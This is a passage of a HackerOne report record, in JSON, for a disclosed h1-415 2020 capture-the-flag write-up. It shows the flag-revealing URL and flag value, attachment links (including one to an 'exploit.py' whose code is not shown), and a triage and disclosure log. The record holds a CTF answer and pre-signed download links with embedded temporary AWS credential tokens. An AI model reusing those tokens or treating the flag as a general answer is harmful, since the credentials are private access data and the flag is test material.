xasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=dc4ec23acc1cba7c58acb6051370054e9d497ae59522a3f33768441e718418f3\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eRequesting \u003ca title=\"https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab\" href=\"/redirect?url=https%3A%2F%2Fh1-415.h1ctf.com%2Fdocuments%2F0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e would reveal the flag: \u003cstrong\u003eh1ctf{y3s_1m_c0sm1c_n0w}\u003c/strong\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eMostly sleep deprivation.\u003c/p\u003e\n","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":691310,"file_name":"debug-json.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4fmzsc6rwuxakCkALxMLWoMo?response-content-disposition=attachment%3B%20filename%3D%22debug-json.png%22%3B%20filename%2A%3DUTF-8%27%27debug-json.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065058Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026X-Amz-Signature=dc4ec23acc1cba7c58acb6051370054e9d497ae59522a3f33768441e718418f3","file_size":631884,"type":"image/png"},{"id":691360,"file_name":"exploit.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eRxXzsN1hdYGJtVQwe38wL6z?response-content-disposition=attachment%3B%20filename%3D%22exploit.py%22%3B%20filename%2A%3DUTF-8%27%27exploit.py\u0026response-content-type=text%2Fx-python-script\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065058Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026X-Amz-Signature=b8beed49d46caafa0fe398e7dc8b3808baee4ca280358032848ced808e3872ce","file_size":3165,"type":"text/x-python-script"}],"allow_singular_disclosure_at":"2020-03-04T20:36:01.338Z","allow_singular_disclosure_after":-25870496.713446535,"singular_disclosure_allowed":true,"vote_count":7,"voters":["nytr0gen","checkm50","wh0ru","janmasarik","0xacb","nukedx","b9372d4605459ca97219795"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":42751,"asset_type":"URL","asset_identifier":"https://h1-415.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6830492,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"#","markdown_message":"","automated_response":false,"created_at":"2020-01-21T18:16:11.634Z","updated_at":"2020-01-21T18:16:11.634Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6852644,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there,\n\nJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \n\nThanks! ","markdown_message":"\u003cp\u003eHey there,\u003c/p\u003e\n\n\u003cp\u003eJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \u003c/p\u003e\n\n\u003cp\u003eThanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T18:13:03.578Z","updated_at":"2020-01-23T18:13:03.578Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6934819,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Hackers! \n\nI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! ","markdown_message":"\u003cp\u003eHello Hackers! \u003c/p\u003e\n\n\u003cp\u003eI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T18:04:59.384Z","updated_at":"2020-01-31T18:04:59.384Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953831,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:32:39.382Z","updated_at":"2020-02-03T20:32:39.382Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"bayotop","url":"/bayotop"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953867,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:36:01.082Z","updated_at":"2020-02-03T20:36:01.082Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6954757,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T22:32:09.724Z","updated_at":"2020-02-03T22:32:09.724Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6954758,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T22:32:09.760Z","updated_at":"2020-02-03T22:32:09.760Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8236806,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-08T21:12:29.503Z","updated_at":"2020-06-08T21:12:29.503Z","additional_data":{"old_title":"@_bayotop h1-415-ctf writeup","new_title":"[h1-415 2020] @_bayotop h1-415-ctf writeup"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}